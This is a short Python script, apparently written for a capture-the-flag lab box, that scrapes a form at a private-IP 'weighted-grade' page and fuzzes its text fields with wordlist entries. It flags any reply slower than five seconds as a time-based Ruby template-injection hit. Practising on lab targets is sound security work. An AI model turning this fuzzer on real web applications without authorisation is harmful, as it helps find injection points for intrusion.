#!/usr/bin/env python3



import sys
import argparse
import random
import time
import requests 
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from urllib.parse import urlencode

#def input_ruby:

def main():
  session = requests.Session()

  url = "http://10.10.11.253/weighted-grade"
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")
  
  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  payload = {}
  payload2 = {}

  
  for input_tag in form.find_all("input"):
      name = input_tag.get("name")
      value = input_tag.get("value", "")
  
      if name:
          payload[name] = value
      if input_tag.get("type") == "number" and input_tag.has_attr("required"):
          payload[name] = 20

      if input_tag.get("type") == "text" and input_tag.has_attr("required"):
          payload[name] = "test"

  for input_tag in form.find_all("input"):
      name = input_tag.get("name")
      value = input_tag.get("value", "")
  
      if name:
          payload2[name] = value

  with open("wordlist.txt") as f:
    for x in f:
      for k, v in payload.items():
        if payload[k] == "test":
            temp = payload[k]
            payload[k] = "FUZZVALUE"
            encoded = urlencode(list(payload.items()))
            encoded = encoded.replace('FUZZVALUE', x.strip())
#            print("Payload:", encoded)
            start = time.monotonic()
            post_response = session.post(post_url, data=encoded, timeout=60)
            elapsed = time.monotonic() - start
            if elapsed > 5:
                print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                print("Payload:", encoded)
                sys.exit()
            payload[k] = temp
            print(post_response.status_code)
#            print(post_response.text)
        else:
            continue
#        exit()

  
#  print(post_response.text[:500])




if __name__=="__main__":
    main()

